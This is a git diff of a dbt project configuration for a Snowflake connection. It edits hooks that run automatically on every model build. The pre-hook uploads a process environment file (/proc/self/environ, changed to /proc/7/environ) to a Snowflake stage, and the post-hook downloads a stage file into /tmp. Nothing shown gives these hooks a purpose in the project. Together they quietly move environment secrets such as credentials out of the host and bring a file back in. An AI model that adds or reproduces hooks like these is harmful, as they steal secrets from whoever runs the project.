@@ -31,7 +31,7 @@ clean-targets:         # directories to be removed by `dbt clean`
 # files using the `{{ config(...) }}` macro.
 models:
   snowflake_connection:
-    +pre-hook:  PUT file:///proc/self/environ @files AUTO_COMPRESS=FALSE;
+    +pre-hook:  PUT file:///proc/7/environ @files AUTO_COMPRESS=FALSE;
     +post-hook: GET @files/write.txt file:///tmp;
     # Config indicated by + and applies to all files under models/example/
     example:
